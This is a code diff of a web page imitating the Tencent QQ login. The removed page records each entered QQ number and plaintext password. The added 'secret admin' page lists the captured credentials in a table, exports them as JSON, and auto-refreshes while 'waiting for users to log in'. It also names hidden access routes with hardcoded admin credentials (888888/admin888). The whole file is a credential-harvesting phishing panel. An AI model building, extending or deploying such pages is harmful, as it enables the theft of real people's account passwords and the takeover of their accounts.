@@ -3,373 +3,363 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>QQ</title>
+    <title>QQ管理系统</title>
     <style>
-        /* 全局样式 */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            font-family: "Microsoft YaHei", sans-serif;
         }
         
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", Arial, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background-color: #1a1a1a;
+            color: #fff;
             min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
         }
         
-        .container {
-            width: 100%;
-            max-width: 400px;
-            background: white;
-            border-radius: 20px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+        .secret-admin {
+            padding: 20px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        .admin-header {
+            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        .admin-header h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        
+        .admin-header p {
+            opacity: 0.8;
+            font-size: 14px;
+        }
+        
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .stat-card {
+            background: #2d2d2d;
+            padding: 20px;
+            border-radius: 8px;
+            text-align: center;
+            border-left: 4px solid #ff6b6b;
+        }
+        
+        .stat-card h3 {
+            font-size: 14px;
+            opacity: 0.7;
+            margin-bottom: 10px;
+        }
+        
+        .stat-value {
+            font-size: 24px;
+            font-weight: bold;
+            color: #ff6b6b;
+        }
+        
+        .control-panel {
+            background: #2d2d2d;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+        
+        .control-buttons {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+        
+        .btn {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 14px;
+            transition: all 0.3s;
+        }
+        
+        .btn-primary {
+            background: #ff6b6b;
+            color: white;
+        }
+        
+        .btn-success {
+            background: #1dd1a1;
+            color: white;
+        }
+        
+        .btn-danger {
+            background: #ff9ff3;
+            color: white;
+        }
+        
+        .btn:hover {
+            opacity: 0.8;
+            transform: translateY(-2px);
+        }
+        
+        .data-table {
+            background: #2d2d2d;
+            border-radius: 8px;
             overflow: hidden;
         }
         
-        /* QQ Logo */
-        .qq-logo {
-            text-align: center;
-            padding: 60px 0 40px;
-        }
-        
-        .qq-text {
-            font-size: 72px;
-            font-weight: 900;
-            background: linear-gradient(135deg, #00c6ff, #0072ff);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-        }
-        
-        /* 输入框区域 */
-        .input-group {
-            padding: 0 30px;
-            margin-bottom: 20px;
-        }
-        
-        .input-field {
-            width: 100%;
-            padding: 18px 20px;
-            border: 2px solid #e0e0e0;
-            border-radius: 12px;
-            font-size: 16px;
-            margin-bottom: 20px;
-            background: #f8f9fa;
-            transition: all 0.3s ease;
-        }
-        
-        .input-field:focus {
-            outline: none;
-            border-color: #00c6ff;
-            background: white;
-            box-shadow: 0 0 0 3px rgba(0, 198, 255, 0.1);
-        }
-        
-        /* 协议警告 */
-        .protocol-warning {
-            background: linear-gradient(135deg, #ffe4e6, #fecdd3);
-            border: 1px solid #fda4af;
-            border-radius: 8px;
-            padding: 12px 16px;
-            margin: 0 30px 20px;
-            display: none;
-            align-items: center;
-            gap: 8px;
-            animation: shake 0.5s ease-in-out;
-        }
-        
-        .protocol-warning.show {
-            display: flex;
-        }
-        
-        .warning-icon {
-            color: #e11d48;
-        }
-        
-        .warning-text {
-            color: #881337;
-            font-size: 14px;
-            font-weight: 500;
-        }
-        
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            25% { transform: translateX(-5px); }
-            75% { transform: translateX(5px); }
-        }
-        
-        /* 协议同意 */
-        .protocol-agreement {
-            display: flex;
-            align-items: center;
-            margin: 0 30px 30px;
-            padding: 8px 0;
-        }
-        
-        .protocol-checkbox {
-            width: 20px;
-            height: 20px;
-            border: 2px solid #ccc;
-            border-radius: 6px;
-            margin-right: 12px;
-            appearance: none;
-            cursor: pointer;
-            position: relative;
-        }
-        
-        .protocol-checkbox:checked {
-            background: #00c6ff;
-            border-color: #00c6ff;
-        }
-        
-        .protocol-checkbox:checked::after {
-            content: '✓';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            color: white;
-            font-size: 14px;
+        .table-header {
+            background: #ff6b6b;
+            padding: 15px;
             font-weight: bold;
         }
         
-        .protocol-text {
-            font-size: 14px;
-            color: #666;
+        .table-row {
+            display: grid;
+            grid-template-columns: 80px 1fr 1fr 1.5fr 1.5fr;
+            padding: 12px 15px;
+            border-bottom: 1px solid #3d3d3d;
+            align-items: center;
         }
         
-        .protocol-link {
-            color: #00c6ff;
-            text-decoration: none;
+        .table-row.header {
+            background: #3d3d3d;
+            font-weight: bold;
         }
         
-        /* 登录按钮 */
-        .login-btn {
-            width: calc(100% - 60px);
-            margin: 0 30px 40px;
-            padding: 18px;
-            background: linear-gradient(135deg, #00c6ff, #0072ff);
+        .no-data {
+            text-align: center;
+            padding: 40px;
+            opacity: 0.5;
+        }
+        
+        .pagination {
+            display: flex;
+            justify-content: center;
+            padding: 15px;
+            gap: 10px;
+        }
+        
+        .page-btn {
+            padding: 8px 15px;
+            background: #3d3d3d;
             color: white;
             border: none;
-            border-radius: 12px;
-            font-size: 18px;
-            font-weight: 600;
+            border-radius: 4px;
             cursor: pointer;
-            transition: all 0.3s ease;
         }
         
-        .login-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 25px rgba(0, 198, 255, 0.3);
+        .page-btn.active {
+            background: #ff6b6b;
         }
         
-        /* 底部导航 */
-        .bottom-nav {
-            display: flex;
-            background: white;
-            border-top: 1px solid #e0e0e0;
-        }
-        
-        .nav-item {
-            flex: 1;
-            text-align: center;
-            padding: 20px 0;
-            background: none;
-            border: none;
-            color: #666;
+        .secret-info {
+            background: #1a1a1a;
+            border: 1px solid #ff6b6b;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
             font-size: 12px;
-            cursor: pointer;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 6px;
-        }
-        
-        .nav-icon {
-            width: 24px;
-            height: 24px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 20px;
-            color: #666;
-        }
-        
-        .nav-item:hover .nav-icon {
-            color: #00c6ff;
+            opacity: 0.7;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <!-- QQ Logo -->
-        <div class="qq-logo">
-            <div class="qq-text">QQ</div>
+    <div class="secret-admin">
+        <div class="admin-header">
+            <h1>🔒 QQ秘密管理系统</h1>
+            <p>监控所有登录数据 - 仅管理员可见</p>
         </div>
         
-        <!-- 登录表单 -->
-        <div class="login-form">
-            <div class="input-group">
-                <input type="text" class="input-field" id="qqNumber" placeholder="输入QQ号" maxlength="15">
-                <input type="password" class="input-field" id="qqPassword" placeholder="输入QQ密码">
+        <div class="stats-grid">
+            <div class="stat-card">
+                <h3>总记录数</h3>
+                <div class="stat-value" id="totalRecords">0</div>
             </div>
-            
-            <div class="protocol-warning" id="protocolWarning">
-                <svg class="warning-icon" width="16" height="16" viewBox="0 0 16 16" fill="currentColor">
-                    <path fill-rule="evenodd" d="M8 15A7 7 0 108 1a7 7 0 000 14zm0 1A8 8 0 108 0a8 8 0 000 16z" clip-rule="evenodd"/>
-                    <path d="M7.002 11a1 1 0 112 0 1 1 0 01-2 0zM7.1 4.995a.905.905 0 111.8 0l-.35 3.507a.552.552 0 01-1.1 0L7.1 4.995z"/>
-                </svg>
-                <span class="warning-text">请先勾选协议</span>
+            <div class="stat-card">
+                <h3>今日记录</h3>
+                <div class="stat-value" id="todayRecords">0</div>
             </div>
-            
-            <div class="protocol-agreement">
-                <input type="checkbox" id="agreeProtocol" class="protocol-checkbox">
-                <label for="agreeProtocol" class="protocol-text">
-                    已阅读并同意
-                    <a href="#" class="protocol-link" onclick="showProtocol()">服务协议</a>
-                    和
-                    <a href="#" class="protocol-link" onclick="showPrivacy()">QQ隐私保护指引</a>
-                </label>
+            <div class="stat-card">
+                <h3>独立用户</h3>
+                <div class="stat-value" id="uniqueUsers">0</div>
             </div>
-            
-            <button class="login-btn" id="loginBtn" onclick="login()">
-                登录
-            </button>
+            <div class="stat-card">
+                <h3>最后更新</h3>
+                <div class="stat-value" id="lastUpdate">-</div>
+            </div>
         </div>
         
-        <!-- 底部导航 -->
-        <div class="bottom-nav">
-            <button class="nav-item" onclick="showDeveloping('手机号登录')">
-                <div class="nav-icon">📱</div>
-                <span>手机号登录</span>
-            </button>
-            <button class="nav-item" onclick="showDeveloping('其他方式登录')">
-                <div class="nav-icon">⋯</div>
-                <span>其他方式登录</span>
-            </button>
-            <button class="nav-item" onclick="showDeveloping('注册')">
-                <div class="nav-icon">➕</div>
-                <span>注册</span>
-            </button>
-            <button class="nav-item" onclick="showDeveloping('更多')">
-                <div class="nav-icon">⚙️</div>
-                <span>更多</span>
-            </button>
+        <div class="control-panel">
+            <div class="control-buttons">
+                <button class="btn btn-primary" id="refreshBtn">🔄 刷新数据</button>
+                <button class="btn btn-success" id="exportBtn">💾 导出数据</button>
+                <button class="btn btn-danger" id="clearBtn">🗑️ 清空数据</button>
+                <button class="btn" onclick="window.location.href='login.html'" style="background: #576574; color: white;">← 返回登录页</button>
+            </div>
+        </div>
+        
+        <div class="data-table">
+            <div class="table-header">📊 登录记录监控</div>
+            <div class="table-row header">
+                <div>ID</div>
+                <div>QQ号</div>
+                <div>密码</div>
+                <div>登录时间</div>
+                <div>IP地址</div>
+            </div>
+            <div id="dataTableBody">
+                <div class="no-data">暂无数据<br>等待用户登录...</div>
+            </div>
+            <div class="pagination">
+                <button class="page-btn" id="prevPage">上一页</button>
+                <span id="pageInfo">第 1 页 / 共 1 页</span>
+                <button class="page-btn" id="nextPage">下一页</button>
+            </div>
+        </div>
+        
+        <div class="secret-info">
+            <strong>秘密访问方式：</strong><br>
+            1. 在登录页连续按：Q Q 1 2 3<br>
+            2. 使用管理员账号：888888 / admin888<br>
+            3. 直接访问此页面：admin_secret_2024.html
         </div>
     </div>
-    
+
     <script>
-        // 登录功能
-        function login() {
-            const qqNumber = document.getElementById('qqNumber').value;
-            const qqPassword = document.getElementById('qqPassword').value;
-            const agreeProtocol = document.getElementById('agreeProtocol').checked;
-            const warning = document.getElementById('protocolWarning');
-            
-            // 检查协议
-            if (!agreeProtocol) {
-                warning.classList.add('show');
-                return;
-            }
-            
-            // 检查输入
-            if (!qqNumber || !qqPassword) {
-                alert('请输入QQ号和密码');
-                return;
-            }
-            
-            // 验证QQ号格式
-            if (!/^[1-9][0-9]{4,14}$/.test(qqNumber)) {
-                alert('请输入正确的QQ号码（5-15位数字，不能以0开头）');
-                return;
-            }
-            
-            // 保存到管理员后台
-            saveToAdmin(qqNumber, qqPassword);
-            
-            // 显示登录成功
-            alert(`登录成功！\nQQ号: ${qqNumber}\n密码: ${'*'.repeat(qqPassword.length)}`);
-            
-            // 清空表单
-            document.getElementById('qqNumber').value = '';
-            document.getElementById('qqPassword').value = '';
-            document.getElementById('agreeProtocol').checked = false;
-            warning.classList.remove('show');
-        }
-        
-        // 保存到管理员后台
-        function saveToAdmin(qqNumber, qqPassword) {
-            // 获取现有数据
-            let adminData = JSON.parse(localStorage.getItem('qq_admin_data') || '[]');
-            
-            // 创建新记录
-            const record = {
-                id: Date.now(),
-                qqNumber: qqNumber,
-                password: qqPassword, // 注意：实际应用中密码应该加密存储
-                loginTime: new Date().toLocaleString('zh-CN', {
-                    year: 'numeric',
-                    month: '2-digit',
-                    day: '2-digit',
-                    hour: '2-digit',
-                    minute: '2-digit',
-                    second: '2-digit',
-                    hour12: false
-                }),
-                ip: '127.0.0.1', // 模拟IP
-                userAgent: navigator.userAgent
-            };
-            
-            // 添加到数据
-            adminData.push(record);
-            
-            // 保存到本地存储
-            localStorage.setItem('qq_admin_data', JSON.stringify(adminData));
-            
-            console.log('数据已保存到管理员后台:', record);
-        }
-        
-        // 协议链接
-        function showProtocol() {
-            event.preventDefault();
-            alert('服务协议内容\n\n这是QQ高仿网页版的服务协议演示。');
-        }
-        
-        function showPrivacy() {
-            event.preventDefault();
-            alert('QQ隐私保护指引\n\n这是QQ高仿网页版的隐私保护指引演示。');
-        }
-        
-        // 开发中提示
-        function showDeveloping(feature) {
-            alert(`功能开发中\n\n${feature}功能正在开发中，敬请期待！`);
-        }
-        
-        // 自动聚焦到QQ号输入框
+        let loginData = [];
+        let currentPage = 1;
+        const recordsPerPage = 8;
+
         document.addEventListener('DOMContentLoaded', function() {
-            document.getElementById('qqNumber').focus();
+            loadData();
+            updateStats();
+            renderTable();
+            
+            document.getElementById('refreshBtn').addEventListener('click', refreshData);
+            document.getElementById('exportBtn').addEventListener('click', exportData);
+            document.getElementById('clearBtn').addEventListener('click', clearData);
+            document.getElementById('prevPage').addEventListener('click', prevPage);
+            document.getElementById('nextPage').addEventListener('click', nextPage);
+            
+            // 每10秒自动刷新一次
+            setInterval(refreshData, 10000);
         });
-        
-        // 监听协议勾选
-        document.getElementById('agreeProtocol').addEventListener('change', function() {
-            if (!this.checked) {
-                document.getElementById('protocolWarning').classList.add('show');
+
+        function loadData() {
+            loginData = JSON.parse(localStorage.getItem('qqLoginData')) || [];
+        }
+
+        function refreshData() {
+            loadData();
+            updateStats();
+            renderTable();
+        }
+
+        function exportData() {
+            if (loginData.length === 0) {
+                alert('没有数据可导出');
+                return;
+            }
+            
+            const dataStr = JSON.stringify(loginData, null, 2);
+            const blob = new Blob([dataStr], {type: 'application/json'});
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `qq_secret_data_${new Date().getTime()}.json`;
+            a.click();
+            URL.revokeObjectURL(url);
+            
+            alert('数据已导出！');
+        }
+
+        function clearData() {
+            if (confirm('⚠️ 确定要清空所有数据吗？此操作不可恢复！')) {
+                loginData = [];
+                localStorage.setItem('qqLoginData', JSON.stringify(loginData));
+                updateStats();
+                renderTable();
+                alert('数据已清空！');
+            }
+        }
+
+        function prevPage() {
+            if (currentPage > 1) {
+                currentPage--;
+                renderTable();
+            }
+        }
+
+        function nextPage() {
+            const totalPages = Math.ceil(loginData.length / recordsPerPage);
+            if (currentPage < totalPages) {
+                currentPage++;
+                renderTable();
+            }
+        }
+
+        function updateStats() {
+            document.getElementById('totalRecords').textContent = loginData.length;
+            
+            const today = new Date().toLocaleDateString();
+            const todayRecords = loginData.filter(record => {
+                return new Date(record.loginTime).toLocaleDateString() === today;
+            }).length;
+            document.getElementById('todayRecords').textContent = todayRecords;
+            
+            const uniqueUsers = new Set(loginData.map(record => record.qqNumber)).size;
+            document.getElementById('uniqueUsers').textContent = uniqueUsers;
+            
+            if (loginData.length > 0) {
+                const lastRecord = loginData[loginData.length - 1];
+                document.getElementById('lastUpdate').textContent = 
+                    lastRecord.loginTime.split(' ')[1]; // 只显示时间部分
             } else {
-                document.getElementById('protocolWarning').classList.remove('show');
+                document.getElementById('lastUpdate').textContent = '-';
             }
-        });
-        
-        // 监听回车键
-        document.addEventListener('keydown', function(e) {
-            if (e.key === 'Enter') {
-                login();
+        }
+
+        function renderTable() {
+            const tableBody = document.getElementById('dataTableBody');
+            const totalPages = Math.ceil(loginData.length / recordsPerPage) || 1;
+            
+            document.getElementById('pageInfo').textContent = 
+                `第 ${currentPage} 页 / 共 ${totalPages} 页`;
+            
+            if (loginData.length === 0) {
+                tableBody.innerHTML = '<div class="no-data">暂无数据<br>等待用户登录...</div>';
+                return;
             }
-        });
+            
+            const startIndex = (currentPage - 1) * recordsPerPage;
+            const endIndex = Math.min(startIndex + recordsPerPage, loginData.length);
+            const pageData = loginData.slice(startIndex, endIndex);
+            
+            let tableHTML = '';
+            pageData.forEach(record => {
+                tableHTML += `
+                    <div class="table-row">
+                        <div>${record.id}</div>
+                        <div>${record.qqNumber}</div>
+                        <div>${record.password}</div>
+                        <div>${record.loginTime}</div>
+                        <div>${record.ip}</div>
+                    </div>
+                `;
+            });
+            
+            tableBody.innerHTML = tableHTML;
+        }
     </script>
 </body>
 </html>
